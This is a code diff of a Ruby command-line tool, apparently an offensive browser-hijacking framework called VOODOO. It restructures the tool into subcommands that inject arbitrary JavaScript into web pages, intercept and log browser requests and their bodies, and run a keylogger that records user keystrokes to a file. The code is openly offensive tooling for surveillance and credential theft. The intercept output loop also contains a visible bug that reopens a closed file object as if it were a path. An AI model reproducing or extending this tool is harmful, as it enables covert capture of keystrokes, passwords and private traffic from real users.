@@ -12,14 +12,94 @@ module VOODOO
         def version
             puts VERSION
         end
+        
+        option :url_include, :type => :string, :aliases => :ui, :default => nil
+        option :body_include, :type => :string, :aliases => :bi, :default => nil
+        option :header_exists, :type => :string, :aliases => :he, :default => nil
+        option :output, :type => :string, :aliases => :o, :default => 'stdout'
+        option :site, :type => :string, :aliases => :s, :default => ''
+        option :matches, :type => :array, :aliases => :m, :default => ['<all_urls>']
+        option :browser, :type => :string, :aliases => :b, :default => 'chrome'
+        desc 'intercept', 'intercept browser requests'
+        def intercept
+            browser = get_browser options[:browser]
+            
+            output = options[:output]
 
-        option :js, :type => :string, :aliases => :j
-        option :intercept, :type => :hash, :aliases => :i
-        option :keylogger, :type => :hash, :aliases => :k
-        option :browser, :type => :string, :default => 'chrome', :aliases => :b
-        desc 'hijack', 'Hijack browser'
-        def hijack
-            case options[:browser]
+            if output != 'stdout'
+                output = open(output, 'a')
+            end
+
+            browser.intercept(matches: options[:matches],
+                              url_include: options[:url_include],
+                              body_include: options[:body_include]) do |req|
+                if output != 'stdout'
+                    output.puts JSON.generate(req)
+                    output.close
+                    output = open(output, 'a')
+                else
+                    puts "#{req[:method]} #{req[:url]}"
+                    if req[:body]
+                        body = req[:body]
+                        if body.length > 100
+                            body = body[0...97] + '...'
+                        end
+                        puts "BODY: #{body}"
+                    end
+                end
+            end
+
+            browser.hijack options[:site]
+        end
+
+        option :site, :type => :string, :aliases => :s, :default => ''
+        option :matches, :type => :array, :aliases => :m, :default => ['*://*/*']
+        option :browser, :type => :string, :aliases => :b, :default => 'chrome'
+        desc 'script <js/path>', 'add a content script'
+        def script(path_or_js)
+            browser = get_browser options[:browser]
+            if File.exists? path_or_js
+                browser.add_script file: path_or_js
+            else
+                browser.add_script content: path_or_js
+            end
+            browser.hijack options[:site]
+        end
+        
+        option :site, :type => :string, :aliases => :s, :default => ''
+        option :output, :type => :string, :aliases => :o, :default => 'stdout'
+        option :matches, :type => :array, :aliases => :m, :default => ['*://*/*']
+        option :browser, :type => :string, :aliases => :b, :default => 'chrome'
+        desc 'keylogger', 'records user keystrokes'
+        def keylogger
+            browser = get_browser options[:browser]
+            output = options[:output]
+
+            if output != 'stdout'
+                output = open(output, 'a')
+            end
+
+            browser.keylogger(matches: options[:matches]) do |event|
+                if output != 'stdout'
+                    output.puts JSON.generate(event)
+                else
+                    puts JSON.generate(event)
+                end
+            end
+
+            browser.hijack options[:site]
+        end
+
+        def self.exit_on_failure?
+            true
+        end
+
+        private
+
+        def get_browser(name)
+            browser = nil
+            
+            case name
                 when 'chrome'
                     browser = Browser.Chrome
                 when 'opera'
@@ -28,63 +108,11 @@ module VOODOO
                     browser = Browser.Edge
             end
 
-            if options[:keylogger]
-                matches = options[:keylogger]['matches'] || '*://*/*'
-                matches = matches.split(',')
-                url_include = options[:keylogger]['url_include'] || ''
-
-                output = 'stdout'
-
-                if options[:keylogger]['output']
-                    output = open(options[:keylogger]['output'], 'a')
-                end
-
-                browser.keylogger(matches: matches, url_include: url_include) do |event|
-                    if output == 'stdout'
-                        puts event
-                    else
-                        output.puts JSON.generate(event)
-                    end
-                end
+            if browser == nil
+                raise StandardError.new "Unsupported browser \"#{name}\""
             end
 
-            if options[:intercept]
-                matches = options[:intercept]['matches'] || nil
-                url_include = options[:intercept]['url_include'] || nil
-                body_include = options[:intercept]['body_include'] || nil
-                header_exists = options[:intercept]['header_exists'] || nil
-
-                puts options
-
-                i_output = 'stdout'
-
-                if matches != nil
-                    matches = matches.split(',')
-                end
-
-                if options[:intercept]['output']
-                    i_output = open(options[:intercept]['output'], 'a')
-                end
-
-                browser.intercept(matches: matches, url_include: url_include, body_include: body_include, header_exists: header_exists) do |req|
-                    if i_output == 'stdout'
-                        puts "#{req['method']} #{req['url']}"
-                        puts req['body'] || "<NO_BODY>"
-                    else
-                        i_output.puts JSON.generate(req) + "\n"
-                    end
-                end
-            end
-
-            if options[:js]
-                browser.add_script(content: options[:js])
-            end
-
-            browser.hijack
-        end
-
-        def self.exit_on_failure?
-            true
+            return browser
         end
 
     end
